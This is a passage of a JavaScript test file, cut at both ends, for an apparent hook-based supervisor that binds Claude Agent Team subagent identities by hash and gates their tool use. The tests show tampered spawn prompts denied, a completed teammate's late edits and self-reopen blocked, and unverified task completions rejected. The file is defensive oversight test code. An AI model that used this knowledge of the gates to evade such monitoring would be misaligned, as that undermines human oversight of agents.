  const exact = /NEXT_PROMPT_BEGIN\n([\s\S]*)\nNEXT_PROMPT_END$/.exec(correction)?.[1];
  assert.ok(exact);
  const tampered = h.controller.preTool({ input: {
    ...spawn, tool_input: { ...spawn.tool_input, prompt: exact.replace("jobs, tenant", "jobs") },
  } });
  assert.equal(tampered.output.hookSpecificOutput.permissionDecision, "deny");

  const allowed = h.controller.preTool({ input: {
    ...spawn, tool_input: { ...spawn.tool_input, prompt: exact },
  } });
  assert.equal(allowed.output.hookSpecificOutput.permissionDecision, "allow");
  const bound = h.store.events().find((event) => event.type === "team_delegation_bound");
  const requested = h.store.events().find((event) => event.type === "team_spawn_requested");
  assert.match(bound.delegationBindingHash, /^sha256:/);
  assert.equal(bound.directPromptBound, true);
  assert.equal(requested.delegationBindingHash, bound.delegationBindingHash);
  assert.equal(requested.taskDefinitionHash, bound.taskDefinitionHash);

  const conflict = h.controller.taskCreated({ input: {
    hook_event_name: "TaskCreated", task_id: "scheduler-task",
    task_subject: "scheduler slice",
    task_description: "Implement nextJob(jobs) without tenant.",
    teammate_name: "lead",
  } });
  assert.equal(conflict.output._outsiderExitCode, 2);
  assert.match(h.store.readState().tasks["scheduler-task"].description,
    /nextJob\(jobs, tenant\)/);
  assert.ok(h.store.events().some((event) => event.type === "team_task_definition_conflict"));
});

test("a logical teammate receipt binds one exact internal SubagentStart on the same host lineage", () => {
  const h = harness({ supervisorHandler: () => ({ ok: true, verdict: {
    onTrack: true, drift: "", plan: [], expectedNextActions: [], acceptanceRisk: "low",
  } }) });
  const shared = { session_id: "real-team-session", transcript_path: h.transcript };
  h.controller.taskCreated({ input: {
    hook_event_name: "TaskCreated", task_id: "store-task", task_subject: "store slice",
    task_description: "implement store", teammate_name: "lead",
  } });
  const ownership = { hook_event_name: "PreToolUse", tool_name: "TaskUpdate",
    tool_use_id: "own-store", teammate_name: "lead",
    tool_input: { taskId: "store-task", owner: "store-owner", status: "in_progress" } };
  h.controller.preTool({ input: ownership });
  h.controller.postTool({ input: { ...ownership, hook_event_name: "PostToolUse",
    tool_response: { success: true } } });
  const spawn = { tool_name: "Agent", tool_use_id: "spawn-store-logical",
    tool_input: { name: "store-owner", description: "store", prompt: "implement store" },
    ...shared };
  const boundSpawn = bindNamedAgent(h, spawn).input;
  h.controller.postTool({ input: { ...boundSpawn, hook_event_name: "PostToolUse",
    tool_response: { status: "teammate_spawned", name: "store-owner",
      teammate_id: "store-owner@session-real", agent_id: "store-owner@session-real" } } });
  assert.equal(h.store.events().some((event) => event.type === "team_identity_bound"), false,
    "the logical receipt waits for the execution identity");
  h.controller.subagentStart({ input: { hook_event_name: "SubagentStart",
    agent_id: "astore-owner-internal-123", agent_type: "general-purpose", ...shared } });
  const state = h.store.readState();
  assert.equal(state.agentAliases["astore-owner-internal-123"], "teammate:store-owner");
  const binding = h.store.events().find((event) => event.type === "team_identity_bound");
  assert.match(binding.identityBindingHash, /^sha256:/);
  assert.notEqual(binding.agentIdHash, binding.receiptAgentIdHash,
    "the execution id and logical host receipt remain separately attestable");
  assert.equal(h.store.events().some((event) => event.type === "team_identity_binding_conflict"),
    false);
});

test("a receipt-first logical teammate joins the exact Claude 2.1.219 execution id under concurrent starts", () => {
  const h = harness();
  const shared = { session_id: "receipt-first-real-shape", transcript_path: h.transcript };
  for (const [id, owner] of [["store-task", "store-owner"],
    ["scheduler-task", "scheduler-owner"]]) {
    h.controller.taskCreated({ input: {
      hook_event_name: "TaskCreated", task_id: id, task_subject: id,
      task_description: id, teammate_name: "lead",
    } });
    const ownership = { hook_event_name: "PreToolUse", tool_name: "TaskUpdate",
      tool_use_id: `own-${id}`, teammate_name: "lead",
      tool_input: { taskId: id, owner, status: "pending" } };
    h.controller.preTool({ input: ownership });
    h.controller.postTool({ input: { ...ownership, hook_event_name: "PostToolUse",
      tool_response: { success: true } } });
  }
  const spawn = (name, toolUseId) => ({ tool_name: "Agent", tool_use_id: toolUseId,
    tool_input: { name, description: name, prompt: `implement ${name}` }, ...shared });
  const store = bindNamedAgent(h, spawn("store-owner", "spawn-store-live-shape")).input;
  h.controller.subagentStart({ input: { hook_event_name: "SubagentStart",
    agent_id: "astore-owner-0123456789abcdef", ...shared } });
  h.controller.postTool({ input: { ...store, hook_event_name: "PostToolUse",
    tool_response: { toolUseResult: { status: "teammate_spawned", isAsync: false,
      agentId: "store-owner@logical-session",
      pin: { id: "store-owner@logical-session", name: "store-owner" } } } } });

  const scheduler = bindNamedAgent(h,
    spawn("scheduler-owner", "spawn-scheduler-live-shape")).input;
  h.controller.postTool({ input: { ...scheduler, hook_event_name: "PostToolUse",
    tool_response: { toolUseResult: { status: "teammate_spawned", isAsync: false,
      agentId: "scheduler-owner@logical-session",
      pin: { id: "scheduler-owner@logical-session", name: "scheduler-owner" } } } } });
  assert.equal(h.store.events().some((event) => event.type === "team_identity_bound"
    && event.identityJoin === "claude-2.1.219-execution-id-name"), false);
  h.controller.subagentStart({ input: { hook_event_name: "SubagentStart",
    agent_id: "ascheduler-owner-fedcba9876543210", ...shared } });

  const state = h.store.readState();
  assert.equal(state.agentAliases["ascheduler-owner-fedcba9876543210"],
    "teammate:scheduler-owner");
  const binding = h.store.events().find((event) => event.type === "team_identity_bound"
    && event.identityJoin === "claude-2.1.219-execution-id-name");
  assert.ok(binding, JSON.stringify({ events: h.store.events().filter((event) =>
    event.type.startsWith("team_") || event.type === "agent_registered"),
  state: h.store.readState() }));
  assert.equal(binding.taskLinkStatus, "unique-owned-team-task");
  assert.equal(h.store.events().some((event) => event.type === "team_identity_binding_conflict"),
    false);
});

test("implicit Agent Team identity requires an exact teammate_spawned host receipt", () => {
  const h = harness({ supervisorHandler: () => ({ ok: true, verdict: {
    onTrack: true, drift: "", plan: [], expectedNextActions: [], acceptanceRisk: "low",
  } }) });
  const shared = {
    session_id: "implicit-team-main-session",
    transcript_path: h.transcript,
  };
  h.controller.taskCreated({ input: {
    hook_event_name: "TaskCreated", task_id: "store-team-task",
    task_subject: "store slice", task_description: "implement the store slice",
    teammate_name: "lead",
  } });
  const ownerStoreTask = {
    hook_event_name: "PreToolUse", tool_name: "TaskUpdate", tool_use_id: "own-store-task",
    teammate_name: "lead",
    tool_input: { taskId: "store-team-task", owner: "store-owner", status: "in_progress" },
  };
  h.controller.preTool({ input: ownerStoreTask });
  h.controller.postTool({ input: { ...ownerStoreTask, hook_event_name: "PostToolUse",
    tool_response: { success: true } } });
  h.controller.taskCreated({ input: {
    hook_event_name: "TaskCreated", task_id: "integration",
    task_subject: "integrate store", task_description: "verify the combined graph",
    teammate_name: "lead",
  } });
  h.controller.postTool({ input: {
    hook_event_name: "PostToolUse", tool_name: "TaskUpdate", teammate_name: "lead",
    tool_input: { taskId: "integration", owner: "lead", addBlockedBy: ["store-team-task"] },
  } });
  const initialFileHash = snapshotWorkspace(h.cwd).files["src/value.js"].sha;
  const boundSpawn = bindNamedAgent(h, {
    hook_event_name: "PreToolUse", tool_name: "Agent", tool_use_id: "spawn-store-owner",
    tool_input: { name: "store-owner", description: "store slice",
      prompt: "implement the store slice without weakening the contract" },
    ...shared,
  });
  const pre = boundSpawn.allowed;
  assert.equal(pre.output.hookSpecificOutput.permissionDecision, "allow");

  /* Claude 2.1.219 emits SubagentStart before the spawning Agent's
     PostToolUse.  Until the host receipt arrives this id is only a subagent. */
  const started = h.controller.subagentStart({ input: {
    hook_event_name: "SubagentStart", agent_id: "host-agent-store",
    agent_type: "claude", ...shared,
  } });
  assert.match(started.output.hookSpecificOutput.additionalContext, /被委派的子 agent/);
  assert.equal(h.store.readState().agents["host-agent-store"].agentKind, "subagent");

  h.controller.postTool({ input: {
    ...boundSpawn.input, hook_event_name: "PostToolUse",
    tool_response: { status: "teammate_spawned", agentId: "host-agent-store",
      pin: { id: "host-agent-store" } },
    ...shared,
  } });
  const firstAction = h.controller.preTool({ input: {
    hook_event_name: "PreToolUse", tool_name: "Read", tool_use_id: "store-first-action",
    tool_input: { file_path: "src/value.js" }, agent_id: "host-agent-store", ...shared,
  } });
  assert.match(firstAction.output.hookSpecificOutput.additionalContext, /Agent Team teammate/);
  const state = h.store.readState();
  assert.equal(state.agentAliases["host-agent-store"], "teammate:store-owner");
  assert.equal(state.agents["teammate:store-owner"].identitySource,
    "host-agent-spawn-binding");
  assert.equal(state.agents["host-agent-store"], undefined);
  assert.equal(state.tasks["store-team-task"].assigneeAgentId, "teammate:store-owner");
  assert.equal(state.tasks["spawn-store-owner"].assigneeAgentId, null,
    "the generic Agent delegation is evidence of spawning, not the shared team task");
  const requested = h.store.events().find((event) => event.type === "team_spawn_requested");
  const bound = h.store.events().find((event) => event.type === "team_identity_bound");
  const capability = h.store.events().find((event) =>
    event.type === "team_spawn_capability_observed");
  assert.match(requested.spawnIntentHash, /^sha256:/);
  assert.match(bound.identityBindingHash, /^sha256:/);
  assert.equal(capability.toolUseId, "spawn-store-owner");
  assert.equal(capability.status, "teammate_spawned");
  assert.equal(capability.isAsync, false);
  assert.equal(capability.bindable, true);
  assert.equal(bound.taskLinkStatus, "unique-owned-team-task");
  assert.match(bound.rawRegistrationEventHash, /^sha256:/);
  assert.match(bound.rawContextEventHash, /^sha256:/);
  assert.ok(bound.rawRegistrationSeq < bound.rawContextSeq);
  assert.ok(bound.rawContextSeq < bound.seq,
    "the binding proves the observed SubagentStart/context preceded the spawn receipt");
  assert.doesNotMatch(JSON.stringify([requested, bound]), /store-owner|host-agent-store/,
    "spawn evidence contains hashes, not host ids or teammate names");

  const editInput = {
    hook_event_name: "PreToolUse", tool_name: "Edit", tool_use_id: "store-edit",
    tool_input: { file_path: "src/value.js", old_string: "1", new_string: "2" },
    agent_id: "host-agent-store", task_id: "store-team-task", ...shared,
  };
  h.controller.preTool({ input: editInput });
  writeFileSync(path.join(h.cwd, "src", "value.js"), "export const value = 2;\n");
  h.controller.postTool({ input: { ...editInput, hook_event_name: "PostToolUse",
    tool_response: { success: true } } });
  const canonicalTouch = h.store.events().find((event) =>
    event.type === "confirmed_file_touch" && event.toolUseId === "store-edit");
  assert.match(canonicalTouch.identityBindingHash, /^sha256:/,
    "an exact persisted teammate binding survives the canonical edit path");
  const checkInput = {
    hook_event_name: "PreToolUse", tool_name: "Bash", tool_use_id: "store-check",
    tool_input: { command: "npm test" }, agent_id: "host-agent-store",
    task_id: "store-team-task", ...shared,
  };
  h.controller.preTool({ input: checkInput });
  h.controller.postTool({ input: { ...checkInput, hook_event_name: "PostToolUse",
    tool_response: { exit_code: 0 } } });
  const completionUpdate = {
    hook_event_name: "PreToolUse", tool_name: "TaskUpdate",
    tool_use_id: "complete-store-team-task",
    tool_input: { taskId: "store-team-task", status: "completed" },
    agent_id: "host-agent-store", ...shared,
  };
  h.controller.preTool({ input: completionUpdate });
  const completed = h.controller.taskCompleted({ input: {
    hook_event_name: "TaskCompleted", task_id: "store-team-task",
    task_subject: "store slice",
  } });
  assert.equal(completed.output._outsiderExitCode, undefined);
  assert.equal(h.store.readState().tasks["store-team-task"].status,
    "awaiting-host-completion-post");
  h.controller.postTool({ input: { ...completionUpdate, hook_event_name: "PostToolUse",
    tool_response: { success: true } } });
  assert.equal(h.store.readState().tasks["store-team-task"].status, "completed");
  const conformance = assessAgentTeamConformance(h.store.events(), {
    requiredTeammateNames: ["store-owner"], minimumTasks: 2,
    requireIntegration: false, requireTeammateSpawnBinding: true,
    expectedFilesByTeammate: { "store-owner": "src/value.js" },
    initialFileHashesByTeammate: { "store-owner": initialFileHash },
  });
  assert.equal(conformance.ok, true, conformance.errors.join("; "));
  assert.equal(conformance.teammateChains[0].identityMode, "host-teammate-spawn-binding");
  assert.ok(conformance.teammateChains[0].verificationSeq
    > conformance.teammateChains[0].touchSeq);
  const completionEvent = h.store.events().find((event) => event.type === "team_task_completed"
    && event.taskId === "store-team-task");
  assert.equal(completionEvent.postHostSucceeded, true);
  assert.match(completionEvent.completionIntentHash, /^sha256:/);
  assert.ok(completionEvent.preBoundarySeq < completionEvent.postBoundarySeq);
});

test("an in-flight raw Edit can cross an exact teammate binding without losing identity", () => {
  const h = harness({ supervisorHandler: () => ({ ok: true, verdict: {
    onTrack: true, drift: "", plan: [], expectedNextActions: [], acceptanceRisk: "low",
  } }) });
  const shared = { session_id: "binding-race", transcript_path: h.transcript };
  h.controller.taskCreated({ input: {
    hook_event_name: "TaskCreated", task_id: "race-task", task_subject: "race slice",
    task_description: "change src/value.js", teammate_name: "lead",
  } });
  const ownRaceTask = {
    hook_event_name: "PreToolUse", tool_name: "TaskUpdate", tool_use_id: "own-race-task",
    teammate_name: "lead",
    tool_input: { taskId: "race-task", owner: "racer", status: "in_progress" },
  };
  h.controller.preTool({ input: ownRaceTask });
  h.controller.postTool({ input: { ...ownRaceTask, hook_event_name: "PostToolUse",
    tool_response: { success: true } } });
  h.controller.taskCreated({ input: {
    hook_event_name: "TaskCreated", task_id: "race-integration",
    task_subject: "integrate race slice", task_description: "integrate race slice",
    teammate_name: "lead",
  } });
  h.controller.postTool({ input: {
    hook_event_name: "PostToolUse", tool_name: "TaskUpdate", teammate_name: "lead",
    tool_input: { taskId: "race-integration", owner: "lead", addBlockedBy: ["race-task"] },
  } });
  const initialFileHash = snapshotWorkspace(h.cwd).files["src/value.js"].sha;
  const boundSpawn = bindNamedAgent(h, {
    hook_event_name: "PreToolUse", tool_name: "Agent", tool_use_id: "spawn-racer",
    tool_input: { name: "racer", prompt: "change the owned file" }, ...shared,
  }).input;
  h.controller.subagentStart({ input: {
    hook_event_name: "SubagentStart", agent_id: "raw-racer", ...shared,
  } });
  const edit = {
    hook_event_name: "PreToolUse", tool_name: "Edit", tool_use_id: "race-edit",
    tool_input: { file_path: "src/value.js" }, agent_id: "raw-racer",
    task_id: "race-task", ...shared,
  };
  h.controller.preTool({ input: edit });
  h.controller.postTool({ input: {
    ...boundSpawn, hook_event_name: "PostToolUse",
    tool_response: { status: "teammate_spawned", agentId: "raw-racer",
      pin: { id: "raw-racer", name: "racer" } }, ...shared,
  } });
  writeFileSync(path.join(h.cwd, "src", "value.js"), "export const value = 7;\n");
  h.controller.postTool({ input: { ...edit, hook_event_name: "PostToolUse",
    tool_response: { success: true } } });
  const touch = h.store.events().find((event) => event.type === "confirmed_file_touch"
    && event.toolUseId === "race-edit");
  assert.equal(touch.agentId, "teammate:racer");
  assert.match(touch.identityBindingHash, /^sha256:/);
  const rawPre = h.store.events().find((event) => event.seq === touch.preBoundarySeq);
  const canonicalPost = h.store.events().find((event) => event.seq === touch.postBoundarySeq);
  const binding = h.store.events().find((event) => event.type === "team_identity_bound");
  assert.equal(rawPre.agentId, "raw-racer");
  assert.equal(canonicalPost.agentId, "teammate:racer");
  assert.ok(rawPre.seq < binding.seq && binding.seq < canonicalPost.seq);

  const check = {
    hook_event_name: "PreToolUse", tool_name: "Bash", tool_use_id: "race-check",
    tool_input: { command: "npm test" }, agent_id: "raw-racer",
    task_id: "race-task", ...shared,
  };
  h.controller.preTool({ input: check });
  h.controller.postTool({ input: { ...check, hook_event_name: "PostToolUse",
    tool_response: { exit_code: 0 } } });
  const completion = {
    hook_event_name: "PreToolUse", tool_name: "TaskUpdate", tool_use_id: "race-complete",
    tool_input: { taskId: "race-task", status: "completed" }, agent_id: "raw-racer", ...shared,
  };
  h.controller.preTool({ input: completion });
  h.controller.taskCompleted({ input: {
    hook_event_name: "TaskCompleted", task_id: "race-task",
  } });
  h.controller.postTool({ input: { ...completion, hook_event_name: "PostToolUse",
    tool_response: { success: true } } });
  const assessed = assessAgentTeamConformance(h.store.events(), {
    requiredTeammateNames: ["racer"], minimumTasks: 2, requireIntegration: false,
    requireTeammateSpawnBinding: true,
    expectedFilesByTeammate: { racer: "src/value.js" },
    initialFileHashesByTeammate: { racer: initialFileHash },
    expectedChecksByTeammate: { racer: "npm test" },
  });
  assert.equal(assessed.ok, true, assessed.errors.join("; "));
});

test("a completed prebinding raw effect is reconciled by hash into the canonical teammate chain", () => {
  const h = harness({ supervisorHandler: () => ({ ok: true, verdict: {
    onTrack: true, drift: "", plan: [], expectedNextActions: [], acceptanceRisk: "low",
  } }) });
  h.controller.taskCreated({ input: {
    hook_event_name: "TaskCreated", task_id: "prebound-task", task_subject: "prebound slice",
    task_description: "change src/value.js", teammate_name: "lead",
  } });
  const owner = {
    hook_event_name: "PreToolUse", tool_name: "TaskUpdate", tool_use_id: "own-prebound",
    tool_input: { taskId: "prebound-task", owner: "prebound", status: "in_progress" },
    teammate_name: "lead",
  };
  h.controller.preTool({ input: owner });
  h.controller.postTool({ input: { ...owner, hook_event_name: "PostToolUse",
    tool_response: { success: true } } });
  h.controller.taskCreated({ input: {
    hook_event_name: "TaskCreated", task_id: "prebound-integration",
    task_subject: "integrate", task_description: "integrate", teammate_name: "lead",
  } });
  h.controller.postTool({ input: {
    hook_event_name: "PostToolUse", tool_name: "TaskUpdate", teammate_name: "lead",
    tool_input: { taskId: "prebound-integration", owner: "lead",
      addBlockedBy: ["prebound-task"] },
  } });
  const initialFileHash = snapshotWorkspace(h.cwd).files["src/value.js"].sha;
  const boundSpawn = bindNamedAgent(h, {
    hook_event_name: "PreToolUse", tool_name: "Agent", tool_use_id: "spawn-prebound",
    tool_input: { name: "prebound", prompt: "change the owned file" },
  }).input;
  h.controller.subagentStart({ input: {
    hook_event_name: "SubagentStart", agent_id: "raw-prebound",
  } });
  const edit = {
    hook_event_name: "PreToolUse", tool_name: "Edit", tool_use_id: "prebound-edit",
    tool_input: { file_path: "src/value.js" }, agent_id: "raw-prebound",
    task_id: "prebound-task",
  };
  h.controller.preTool({ input: edit });
  writeFileSync(path.join(h.cwd, "src", "value.js"), "export const value = 11;\n");
  h.controller.postTool({ input: { ...edit, hook_event_name: "PostToolUse",
    tool_response: { success: true } } });
  h.controller.postTool({ input: {
    ...boundSpawn, hook_event_name: "PostToolUse",
    tool_response: { status: "teammate_spawned", agentId: "raw-prebound",
      pin: { id: "raw-prebound", name: "prebound" } },
  } });
  const reconciled = h.store.events().find((event) =>
    event.type === "team_prebinding_effect_reconciled");
  assert.equal(reconciled.agentId, "teammate:prebound");
  assert.match(reconciled.rawTouchEventHash, /^sha256:/);
  assert.ok(reconciled.rawTouchSeq < reconciled.bindingSeq && reconciled.bindingSeq < reconciled.seq);
  const check = {
    hook_event_name: "PreToolUse", tool_name: "Bash", tool_use_id: "prebound-check",
    tool_input: { command: "npm test" }, agent_id: "raw-prebound", task_id: "prebound-task",
  };
  h.controller.preTool({ input: check });
  h.controller.postTool({ input: { ...check, hook_event_name: "PostToolUse",
    tool_response: { exit_code: 0 } } });
  const finish = {
    hook_event_name: "PreToolUse", tool_name: "TaskUpdate", tool_use_id: "prebound-complete",
    tool_input: { taskId: "prebound-task", status: "completed" }, agent_id: "raw-prebound",
  };
  h.controller.preTool({ input: finish });
  h.controller.taskCompleted({ input: {
    hook_event_name: "TaskCompleted", task_id: "prebound-task",
  } });
  h.controller.postTool({ input: { ...finish, hook_event_name: "PostToolUse",
    tool_response: { success: true } } });
  const assessed = assessAgentTeamConformance(h.store.events(), {
    requiredTeammateNames: ["prebound"], minimumTasks: 2, requireIntegration: false,
    requireTeammateSpawnBinding: true,
    expectedFilesByTeammate: { prebound: "src/value.js" },
    initialFileHashesByTeammate: { prebound: initialFileHash },
    expectedChecksByTeammate: { prebound: "npm test" },
  });
  assert.equal(assessed.ok, true, assessed.errors.join("; "));
});

test("completed teammate work is frozen until lead opens a new verified generation", () => {
  const h = harness({ supervisorHandler: () => ({ ok: true, verdict: {
    onTrack: true, drift: "", plan: [], expectedNextActions: [], acceptanceRisk: "low",
  } }) });
  const shared = { session_id: "reopen-generation", transcript_path: h.transcript };
  h.controller.taskCreated({ input: {
    hook_event_name: "TaskCreated", task_id: "reopen-task", task_subject: "slice",
    task_description: "change src/value.js", teammate_name: "lead", ...shared,
  } });
  h.controller.taskCreated({ input: {
    hook_event_name: "TaskCreated", task_id: "reopen-integration",
    task_subject: "integrate", task_description: "integrate reopened slice",
    teammate_name: "lead", ...shared,
  } });
  const own = {
    hook_event_name: "PreToolUse", tool_name: "TaskUpdate", tool_use_id: "own-reopen",
    tool_input: { taskId: "reopen-task", owner: "reworker", status: "in_progress" },
    teammate_name: "lead", ...shared,
  };
  h.controller.preTool({ input: own });
  h.controller.postTool({ input: { ...own, hook_event_name: "PostToolUse",
    tool_response: { success: true } } });
  const integrate = {
    hook_event_name: "PreToolUse", tool_name: "TaskUpdate", tool_use_id: "own-reopen-integration",
    tool_input: { taskId: "reopen-integration", owner: "lead",
      addBlockedBy: ["reopen-task"], status: "in_progress" }, teammate_name: "lead", ...shared,
  };
  h.controller.preTool({ input: integrate });
  h.controller.postTool({ input: { ...integrate, hook_event_name: "PostToolUse",
    tool_response: { success: true } } });
  const initialFileHash = snapshotWorkspace(h.cwd).files["src/value.js"].sha;
  const boundSpawn = bindNamedAgent(h, {
    hook_event_name: "PreToolUse", tool_name: "Agent", tool_use_id: "spawn-reworker",
    tool_input: { name: "reworker", prompt: "change the owned file" }, ...shared,
  }).input;
  h.controller.subagentStart({ input: {
    hook_event_name: "SubagentStart", agent_id: "raw-reworker", ...shared,
  } });
  h.controller.postTool({ input: {
    ...boundSpawn, hook_event_name: "PostToolUse",
    tool_response: { status: "teammate_spawned", agentId: "raw-reworker",
      pin: { id: "raw-reworker", name: "reworker" } }, ...shared,
  } });
  const actor = { agent_id: "raw-reworker", task_id: "reopen-task", ...shared };
  const editAndPost = (toolUseId, value) => {
    const input = { hook_event_name: "PreToolUse", tool_name: "Edit", tool_use_id: toolUseId,
      tool_input: { file_path: "src/value.js" }, ...actor };
    const pre = h.controller.preTool({ input });
    assert.equal(pre.output.hookSpecificOutput.permissionDecision, "allow");
    writeFileSync(path.join(h.cwd, "src", "value.js"), `export const value = ${value};\n`);
    h.controller.postTool({ input: { ...input, hook_event_name: "PostToolUse",
      tool_response: { success: true } } });
  };
  const checkAndPost = (toolUseId) => {
    const input = { hook_event_name: "PreToolUse", tool_name: "Bash", tool_use_id: toolUseId,
      tool_input: { command: "npm test" }, ...actor };
    h.controller.preTool({ input });
    h.controller.postTool({ input: { ...input, hook_event_name: "PostToolUse",
      tool_response: { exit_code: 0 } } });
  };
  const completeGeneration = (toolUseId) => {
    const input = { hook_event_name: "PreToolUse", tool_name: "TaskUpdate",
      tool_use_id: toolUseId, tool_input: { taskId: "reopen-task", status: "completed" },
      ...actor };
    h.controller.preTool({ input });
    const lifecycle = h.controller.taskCompleted({ input: {
      hook_event_name: "TaskCompleted", task_id: "reopen-task", ...shared,
    } });
    assert.equal(lifecycle.output._outsiderExitCode, undefined,
      lifecycle.output._outsiderStderr ?? "TaskCompleted unexpectedly blocked");
    h.controller.postTool({ input: { ...input, hook_event_name: "PostToolUse",
      tool_response: { success: true } } });
  };
  editAndPost("edit-g1", 2);
  checkAndPost("check-g1");
  completeGeneration("complete-g1");
  assert.equal(h.store.readState().tasks["reopen-task"].taskGeneration, 1);
  assert.equal(h.store.readState().tasks["reopen-task"].status, "completed");

  const blocked = h.controller.preTool({ input: {
    hook_event_name: "PreToolUse", tool_name: "Edit", tool_use_id: "late-edit",
    tool_input: { file_path: "src/value.js" }, ...actor,
  } });
  assert.equal(blocked.output.hookSpecificOutput.permissionDecision, "deny");
  assert.ok(h.store.events().some((event) => event.type === "completed_teammate_action_blocked"));
  const notify = h.controller.preTool({ input: {
    hook_event_name: "PreToolUse", tool_name: "SendMessage", tool_use_id: "ask-reopen",
    tool_input: { recipient: "lead", content: "please reopen" }, ...actor,
  } });
  assert.equal(notify.output.hookSpecificOutput.permissionDecision, "allow");
  const selfReopen = h.controller.preTool({ input: {
    hook_event_name: "PreToolUse", tool_name: "TaskUpdate", tool_use_id: "self-reopen",
    tool_input: { taskId: "reopen-task", status: "in_progress" }, ...actor,
  } });
  assert.equal(selfReopen.output.hookSpecificOutput.permissionDecision, "deny");

  const leadReopen = {
    hook_event_name: "PreToolUse", tool_name: "TaskUpdate", tool_use_id: "lead-reopen",
    tool_input: { taskId: "reopen-task", status: "in_progress" }, teammate_name: "lead",
    ...shared,
  };
  h.controller.preTool({ input: leadReopen });
  h.controller.postTool({ input: { ...leadReopen, hook_event_name: "PostToolUse",
    tool_response: { success: true } } });
  assert.equal(h.store.readState().tasks["reopen-task"].taskGeneration, 2);
  editAndPost("edit-g2", 3);
  checkAndPost("check-g2");
  completeGeneration("complete-g2");
  const completions = h.store.events().filter((event) => event.type === "team_task_completed"
    && event.taskId === "reopen-task");
  assert.deepEqual(completions.map((event) => event.taskGeneration), [1, 2]);
  const assessed = assessAgentTeamConformance(h.store.events(), {
    requiredTeammateNames: ["reworker"], minimumTasks: 1, requireIntegration: false,
    requireTeammateSpawnBinding: true,
    expectedFilesByTeammate: { reworker: "src/value.js" },
    initialFileHashesByTeammate: { reworker: initialFileHash },
    expectedChecksByTeammate: { reworker: "npm test" },
    exactTaskCount: 2, exactTeammateBindingCount: 1,
  });
  assert.equal(assessed.ok, true, assessed.errors.join("; "));
  assert.equal(assessed.teammateChains[0].taskGeneration, 2);
  assert.equal(assessed.teammateChains[0].reopenSeqs.length, 1);
});

test("TaskCompleted without host identity needs one intent and successful matching PostToolUse", () => {
  const h = harness({ supervisorHandler: () => ({ ok: true, verdict: {
    onTrack: true, drift: "", plan: [], expectedNextActions: [], acceptanceRisk: "low",
  } }) });
  h.controller.taskCreated({ input: {
    hook_event_name: "TaskCreated", task_id: "completion-owned",
    task_subject: "complete safely", task_description: "complete safely", teammate_name: "lead",
  } });
  h.controller.postTool({ input: {
    hook_event_name: "PostToolUse", tool_name: "TaskUpdate", teammate_name: "lead",
    tool_input: { taskId: "completion-owned", owner: "alice", status: "in_progress" },
  } });
  h.controller.taskCreated({ input: {
    hook_event_name: "TaskCreated", task_id: "completion-integration",
    task_subject: "integrate", task_description: "integrate", teammate_name: "lead",
  } });
  h.controller.postTool({ input: {
    hook_event_name: "PostToolUse", tool_name: "TaskUpdate", teammate_name: "lead",
    tool_input: { taskId: "completion-integration", owner: "lead",
      addBlockedBy: ["completion-owned"] },
  } });
  const failedOwnerUpdate = {
    hook_event_name: "PreToolUse", tool_name: "TaskUpdate", tool_use_id: "failed-owner-update",
    tool_input: { taskId: "completion-integration", owner: "mallory" }, teammate_name: "lead",
  };
  h.controller.preTool({ input: failedOwnerUpdate });
  h.controller.postTool({ input: { ...failedOwnerUpdate, hook_event_name: "PostToolUse",
    tool_response: { success: false, is_error: true } } });
  assert.equal(h.store.readState().tasks["completion-integration"].owner, "lead");
  assert.ok(h.store.events().some((event) => event.type === "task_update_unconfirmed"
    && event.toolUseId === "failed-owner-update"));
  const missing = h.controller.taskCompleted({ input: {
    hook_event_name: "TaskCompleted", task_id: "completion-owned",
  } });
  assert.equal(missing.output._outsiderExitCode, 2);
  assert.match(missing.output._outsiderStderr, /missing-completion-intent/);

  const first = {
    hook_event_name: "PreToolUse", tool_name: "TaskUpdate", tool_use_id: "complete-fails",
    tool_input: { taskId: "completion-owned", status: "completed" }, teammate_name: "alice",
  };
  h.controller.preTool({ input: first });
  const accepted = h.controller.taskCompleted({ input: {
    hook_event_name: "TaskCompleted", task_id: "completion-owned",
  } });
  assert.equal(accepted.output._outsiderExitCode, undefined, accepted.output._outsiderStderr);
  h.controller.postTool({ input: { ...first, hook_event_name: "PostToolUse",
    tool_response: { success: false, is_error: true } } });
  assert.notEqual(h.store.readState().tasks["completion-owned"].status, "completed");
  assert.ok(h.store.events().some((event) => event.type === "task_completion_post_rejected"
    && event.reason === "host-reported-task-update-failure"));

  for (const toolUseId of ["complete-a", "complete-b"]) {
    h.controller.preTool({ input: { ...first, tool_use_id: toolUseId } });
  }
  const ambiguous = h.controller.taskCompleted({ input: {
    hook_event_name: "TaskCompleted", task_id: "completion-owned",
  } });
  assert.equal(ambiguous.output._outsiderExitCode, 2);
  assert.match(ambiguous.output._outsiderStderr, /multiple-pending-completion-intents/);
});

test("a TaskUpdate Post closes an intent that never obtained a TaskCompleted verification", () => {
  const h = harness();
  h.controller.taskCreated({ input: { hook_event_name: "TaskCreated", task_id: "slice",
    task_subject: "slice", task_description: "slice", teammate_name: "lead" } });
  h.controller.postTool({ input: { hook_event_name: "PostToolUse", tool_name: "TaskUpdate",
    tool_use_id: "owner", tool_input: { taskId: "slice", owner: "alice",
      status: "in_progress" }, teammate_name: "lead", tool_response: { success: true } } });
  const completion = { hook_event_name: "PreToolUse", tool_name: "TaskUpdate",
    tool_use_id: "unverified-completion", tool_input: { taskId: "slice", status: "completed" },
    teammate_name: "alice" };
  h.controller.preTool({ input: completion });
  assert.equal(h.controller.openTaskCompletionIntents("slice").length, 1);
  h.controller.postTool({ input: { ...completion, hook_event_name: "PostToolUse",
    tool_response: { success: false } } });
  assert.equal(h.controller.openTaskCompletionIntents("slice").length, 0);
  const rejected = h.store.events().find((event) =>
    event.type === "task_completion_post_rejected"
    && event.reason === "task-completion-gate-not-confirmed");
  assert.ok(rejected);
});

test("a due semantic patrol defers to the actor-bound TaskCompleted gate", () => {
  let supervisorCalls = 0;
  const h = harness({ semanticPatrolEvery: 2, supervisorHandler: () => {
    supervisorCalls += 1;
    return { ok: true, verdict: { onTrack: true, drift: "", plan: [] } };
  } });
  h.controller.taskCreated({ input: { hook_event_name: "TaskCreated", task_id: "slice",
    task_subject: "slice", task_description: "slice", teammate_name: "lead" } });
  h.controller.postTool({ input: { hook_event_name: "PostToolUse", tool_name: "TaskUpdate",
    tool_input: { taskId: "slice", owner: "alice", status: "in_progress" },
    teammate_name: "lead", tool_response: { success: true } } });
  h.controller.preTool({ input: { hook_event_name: "PreToolUse", tool_name: "Read",
    tool_use_id: "clock-1", tool_input: { file_path: "src/value.js" }, teammate_name: "alice" } });
